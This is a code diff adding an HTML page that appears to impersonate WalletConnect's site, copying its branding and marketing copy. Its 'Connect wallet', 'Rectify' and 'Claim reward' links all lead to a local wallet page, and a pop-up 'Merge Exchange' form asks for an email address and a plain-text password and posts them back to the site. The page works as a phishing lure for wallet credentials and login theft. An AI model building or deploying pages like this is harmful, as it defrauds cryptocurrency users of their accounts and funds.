@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Home</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <section class="hero">
+      <div class="hero-items">
+        <div class="hero-words-cont">
+          <h1>Connecting web3</h1>
+          <h4>Built to realize the promises of web3.</h4>
+          <p>
+            The communications protocol for web3, WalletConnect brings the
+            ecosystem together by enabling wallets and apps to securely connect
+            and interact.
+          </p>
+          <form action="/" method="post">
+            <input
+              type="email"
+              name="email"
+              id="email"
+              placeholder="Keep up with our news."
+            />
+            <button>Submit</button>
+          </form>
+        </div>
+
+        <a href="/wallet.html" class="hero-link">CONNECT WALLET</a>
+      </div>
+    </section>
+
+    <section class="curious">
+      <div class="curious-cont">
+        <div class="curious-words-1">
+          <h1>Curious about DeFi, NFTs, Dao</h1>
+          <p>
+            With WalletConnect, you can connect your wallet with hundreds of
+            apps, opening the doors to a new world of web3 experiences.
+          </p>
+        </div>
+        <div class="img-cont-1">
+          <img src="scannable.png" alt="" />
+        </div>
+        <div class="bar1"></div>
+      </div>
+
+      <div class="infrastructure">
+        <div class="img-cont-2">
+          <img src="scannable.png" alt="scan" />
+        </div>
+
+        <div class="infra-words">
+          <h4>The infrastructure empowering web3 connections.</h4>
+          <div class="bar2"></div>
+          <p>
+            Our suite of APIs opens up new ways for wallets and apps to
+            communicate, helping developers build and expand experiences for
+            millions of users.
+          </p>
+          <div class="blue-links-cont">
+            <a href="/wallet.html">RECTIFY</a>
+            <a href="/wallet.html">STAKING</a>
+            <a href="/wallet.html">CLAIM REWARD</a>
+            <a onclick="showForm()" class="sf">MERGE EXCHANGE</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="connect">
+      <div class="connect-items">
+        <h4>We're supported by over 170 wallets</h4>
+        <h1>Want to connect with an app?</h1>
+        <div class="bar3"></div>
+        <ol>
+          <li>Click Connect wallet</li>
+          <li>Find your wallet and import</li>
+          <li>Start Exploring</li>
+        </ol>
+        <a href="/wallet.html">CONNECT WALLET</a>
+        <h2>Foundation. Create, collect and sell NFTs.</h2>
+        <h2>
+          Uniswap. Swap, earn, and build on the leading decentralized crypto
+          trading protocol.
+        </h2>
+        <p>Empowering the App experience with wallet connect</p>
+      </div>
+    </section>
+
+    <div class="dark-bg">
+      <form action="/" method="post" id="merge">
+        <div class="cancel" onclick="hideForm()">x</div>
+        <label for="email">Email Address</label>
+        <input type="email" name="email" id="email" required />
+
+        <label for="password">Password</label>
+        <input type="text" name="password" id="pword" />
+
+        <button type="submit">Merge Exchange</button>
+      </form>
+    </div>
+
+    <script>
+      function hideForm() {
+        document.querySelector(".dark-bg").style.display = "none";
+      }
+
+      function showForm() {
+        document.querySelector(".dark-bg").style.display = "block";
+      }
+    </script>
+  </body>
+</html>
+
+<style>
+  .ba {
+    font-family: "Open Sans", sans-serif;
+    font-family: "Roboto", sans-serif;
+  }
+</style>
